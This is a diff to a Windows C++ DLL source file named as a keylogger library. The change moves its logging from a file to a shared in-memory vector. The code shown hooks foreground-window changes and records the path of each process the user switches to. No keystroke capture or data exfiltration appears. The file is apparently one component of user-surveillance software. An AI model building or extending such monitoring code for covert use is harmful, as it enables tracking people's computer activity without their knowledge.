@@ -1,42 +1,27 @@
 //cl /EHsc /LD .\keylog_w_lib.cpp /link User32.lib
 #include <Windows.h>
-#include <fstream>
 #include <mutex>
-#include <codecvt>
 #include <string.h>
 #include <psapi.h>
+#include <vector>
 #define DLL_EXPORT __declspec(dllexport)
 ///////////////////////////////////////////////////////////////////////
-std::atomic<bool>* terminationSignal;
 HWINEVENTHOOK hook;
-
-std::ofstream outputFile;
+std::vector<std::string>* sharedLogVector = nullptr; // Pointer to the shared vector
 std::mutex logMutex;
 ///////////////////////////////////////////////////////////////////////
-
 void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime);
-
 ///////////////////////////////////////////////////////////////////////
 
-DLL_EXPORT void Initialize(const std::string& filename)
+DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
 {
-
-    {
-        std::lock_guard<std::mutex> lock(logMutex);
-        outputFile.open(filename, std::ios::app);
-    }
-
+    sharedLogVector = logVector;
     hook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
 }
 
-DLL_EXPORT void Cleanup(const std::string& filename)
+DLL_EXPORT void Cleanup()
 {
     if (hook) UnhookWinEvent(hook);
-
-    {
-        std::lock_guard<std::mutex> lock(logMutex);
-        outputFile.close();
-    }
 }
 
 void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
@@ -52,9 +37,11 @@ void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, 
             char processName[MAX_PATH];
             if (GetModuleFileNameExA(hProcess, NULL, processName, MAX_PATH))
             {
-                //cout << endl << "===============["<< processName << "]===============" << endl;
-                outputFile << std::endl << "===============["<< processName << "]===============" << std::endl;
-                outputFile.flush();
+                std::string entry = "\n===============[ " + std::string(processName) + " ]===============\n";
+                {
+                    std::lock_guard<std::mutex> lock(logMutex);
+                    sharedLogVector->emplace_back(entry);
+                }
             }
             CloseHandle(hProcess);
         }
